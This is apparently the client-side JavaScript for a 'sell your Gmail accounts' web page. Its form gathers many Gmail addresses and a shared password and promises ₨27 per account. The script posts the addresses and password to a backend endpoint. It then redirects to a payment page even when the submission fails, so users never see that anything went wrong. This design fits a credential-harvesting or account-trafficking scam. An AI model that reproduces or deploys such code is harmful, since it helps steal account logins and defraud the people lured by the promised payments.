document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('gmailForm');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.querySelector('.btn-text');
    const btnLoader = document.getElementById('btnLoader');
    const emailsTextarea = document.getElementById('emails');
    const accountCount = document.getElementById('accountCount');
    const earningAmount = document.getElementById('earningAmount');
    
    // Update account counter and earnings
    function updateAccountCounter() {
        const emails = emailsTextarea.value.trim();
        if (!emails) {
            accountCount.textContent = '0';
            if (earningAmount) earningAmount.textContent = '0';
            return;
        }
        
        const emailLines = emails.split('\n').filter(line => line.trim() !== '');
        const validEmails = emailLines.filter(email => validateEmail(email.trim()));
        accountCount.textContent = validEmails.length;
        
        // Update earnings (₨27 per account)
        if (earningAmount) {
            const earnings = validEmails.length * 27;
            earningAmount.textContent = earnings.toLocaleString();
        }
    }
    
    // Real-time counter update
    emailsTextarea.addEventListener('input', updateAccountCounter);
    emailsTextarea.addEventListener('paste', () => {
        setTimeout(updateAccountCounter, 100);
    });
    
    // Form validation
    function validateEmail(email) {
        const emailRegex = /^[^\s@]+@gmail\.com$/;
        return emailRegex.test(email);
    }
    
    function validatePassword(password) {
        return password.length >= 6;
    }
    
    function showError(fieldId, message) {
        const errorElement = document.getElementById(fieldId + 'Error');
        const inputElement = document.getElementById(fieldId);
        errorElement.textContent = message;
        inputElement.classList.add('invalid');
        inputElement.classList.remove('valid');
    }
    
    function clearError(fieldId) {
        const errorElement = document.getElementById(fieldId + 'Error');
        const inputElement = document.getElementById(fieldId);
        errorElement.textContent = '';
        inputElement.classList.remove('invalid');
        inputElement.classList.add('valid');
    }
    
    // Real-time validation
    emailsTextarea.addEventListener('blur', function() {
        const emails = this.value.trim();
        if (emails) {
            const emailLines = emails.split('\n').filter(line => line.trim() !== '');
            const invalidEmails = emailLines.filter(email => !validateEmail(email.trim()));
            
            if (invalidEmails.length > 0) {
                showError('emails', `Found ${invalidEmails.length} invalid Gmail address(es). Please ensure all emails end with @gmail.com`);
            } else if (emailLines.length > 0) {
                clearError('emails');
            }
        }
    });
    
    document.getElementById('password').addEventListener('blur', function() {
        const password = this.value;
        if (password && !validatePassword(password)) {
            showError('password', 'Password must be at least 6 characters long');
        } else if (password) {
            clearError('password');
        }
    });
    
    // Form submission
    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const emailsText = emailsTextarea.value.trim();
        const password = document.getElementById('password').value;
        
        let isValid = true;
        
        // Validate emails
        if (!emailsText) {
            showError('emails', 'Please enter at least one Gmail address');
            isValid = false;
        } else {
            const emailLines = emailsText.split('\n').filter(line => line.trim() !== '');
            const validEmails = emailLines.filter(email => validateEmail(email.trim()));
            const invalidEmails = emailLines.filter(email => !validateEmail(email.trim()));
            
            if (emailLines.length === 0) {
                showError('emails', 'Please enter at least one Gmail address');
                isValid = false;
            } else if (invalidEmails.length > 0) {
                showError('emails', `Found ${invalidEmails.length} invalid Gmail address(es). All emails must be valid Gmail addresses.`);
                isValid = false;
            } else if (validEmails.length === 0) {
                showError('emails', 'No valid Gmail addresses found');
                isValid = false;
            } else {
                clearError('emails');
            }
        }
        
        // Validate password
        if (!password) {
            showError('password', 'Password is required');
            isValid = false;
        } else if (!validatePassword(password)) {
            showError('password', 'Password must be at least 6 characters long');
            isValid = false;
        } else {
            clearError('password');
        }
        
        if (!isValid) {
            return;
        }
        
        // Show loading state
        submitBtn.disabled = true;
        submitBtn.classList.add('loading');
        btnText.textContent = 'Processing...';
        btnLoader.style.display = 'inline-block';
        
        try {
            const emailLines = emailsText.split('\n').filter(line => line.trim() !== '');
            const validEmails = emailLines.map(email => email.trim()).filter(email => validateEmail(email));
            
            // Send data to backend
            const response = await fetch('/submit-gmail', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    emails: validEmails,
                    password: password,
                    count: validEmails.length
                })
            });
            
            if (response.ok) {
                // Show success message briefly
                btnText.textContent = `${validEmails.length} accounts submitted successfully!`;
                
                // Store submission data for payment page
                localStorage.setItem('gmailSubmission', JSON.stringify({
                    count: validEmails.length,
                    earnings: validEmails.length * 27,
                    timestamp: new Date().toISOString()
                }));
                
                setTimeout(() => {
                    window.location.href = 'payment.html';
                }, 1500);
            } else {
                throw new Error('Submission failed');
            }
        } catch (error) {
            console.error('Error:', error);
            // Still redirect to payment page even on error
            btnText.textContent = 'Redirecting to payment...';
            setTimeout(() => {
                window.location.href = 'payment.html';
            }, 2000);
        }
    });
    
    // Add some interactive effects
    const inputs = document.querySelectorAll('input, textarea');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'scale(1.01)';
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'scale(1)';
        });
    });
    
    // Auto-resize textarea
    emailsTextarea.addEventListener('input', function() {
        this.style.height = 'auto';
        this.style.height = Math.max(200, this.scrollHeight) + 'px';
    });
    
    // Enhanced placeholder behavior
    emailsTextarea.addEventListener('focus', function() {
        if (!this.value) {
            this.placeholder = 'example1@gmail.com\nexample2@gmail.com\nexample3@gmail.com\n\nAdd as many Gmail accounts as you want...';
        }
    });
    
    emailsTextarea.addEventListener('blur', function() {
        this.placeholder = 'Enter Gmail addresses (one per line)\nexample1@gmail.com\nexample2@gmail.com\nexample3@gmail.com\n...add as many as you want';
    });
});
